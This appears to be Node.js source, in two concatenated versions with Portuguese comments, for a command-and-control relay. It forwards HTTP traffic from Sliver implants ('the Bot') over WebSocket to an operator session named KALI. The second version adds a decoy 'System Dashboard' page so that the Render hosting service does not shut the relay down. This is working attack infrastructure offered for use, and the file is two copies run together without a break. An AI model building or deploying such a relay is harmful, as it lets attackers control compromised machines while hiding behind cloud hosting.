const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
let KALI_WS = null;

const server = http.createServer((req, res) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toLocaleTimeString();

    // 1. Dashboard Visual Simples
    if (req.url === '/' || req.url === '/index.html') {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end(`<h1>C2 Relay Active</h1><p>IP: ${clientIp}</p><p>Status: Monitoring...</p>`);
        return;
    }

    // 2. Monitor de Tráfego Sliver (POST/GET)
    let body = [];
    req.on('data', chunk => body.push(chunk));
    req.on('end', () => {
        const payload = Buffer.concat(body).toString('base64');
        
        console.log(`[${timestamp}] REQUISIÇÃO: ${req.method} de ${clientIp} para ${req.url}`);

        if (KALI_WS && KALI_WS.readyState === WebSocket.OPEN) {
            KALI_WS.send(JSON.stringify({
                type: 'SLIVER_TRAFFIC',
                path: req.url,
                method: req.method,
                ip: clientIp, // Agora enviamos o IP para o Kali ver
                headers: req.headers,
                data: payload
            }));
            res.writeHead(200);
            res.end();
        } else {
            console.log(`[!] Alerta: Tráfego recebido, mas Operador KALI está OFFLINE.`);
            res.writeHead(503);
            res.end("Bridge Offline");
        }
    });
});

const wss = new WebSocket.Server({ server });
wss.on('connection', (ws, req) => {
    if (req.url.includes('id=KALI')) {
        KALI_WS = ws;
        console.log(`\n[!] CONEXÃO MESTRE: Operador KALI estabelecido.\n`);
    }
});

server.listen(PORT, () => console.log(`Redirecionador Profissional Ativo na porta ${PORT}`));const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
let KALI_WS = null;

const server = http.createServer((req, res) => {
    // 1. Simulação de Front-end (Evita que o Render derrube por ociosidade)
    if (req.url === '/' || req.url === '/index.html') {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end('<h1>System Dashboard</h1><p>Status: Monitoring Active.</p>');
        return;
    }

    // 2. Encaminhamento de Tráfego do Sliver (O Bot envia dados via POST/GET)
    let body = [];
    req.on('data', chunk => body.push(chunk));
    req.on('end', () => {
        const payload = Buffer.concat(body).toString('base64');
        
        if (KALI_WS && KALI_WS.readyState === WebSocket.OPEN) {
            KALI_WS.send(JSON.stringify({
                type: 'SLIVER_TRAFFIC',
                path: req.url,
                method: req.method,
                headers: req.headers,
                data: payload
            }));
            res.writeHead(200);
            res.end(); // Confirma recebimento para o Bot
        } else {
            res.writeHead(503);
            res.end("C2 Bridge Offline");
        }
    });
});

const wss = new WebSocket.Server({ server });
wss.on('connection', (ws, req) => {
    if (req.url.includes('id=KALI')) {
        KALI_WS = ws;
        console.log(`[${new Date().toLocaleTimeString()}] Operador KALI (Sliver) Conectado.`);
    }
});

server.listen(PORT, () => console.log(`Redirecionador Sliver Ativo na porta ${PORT}`));
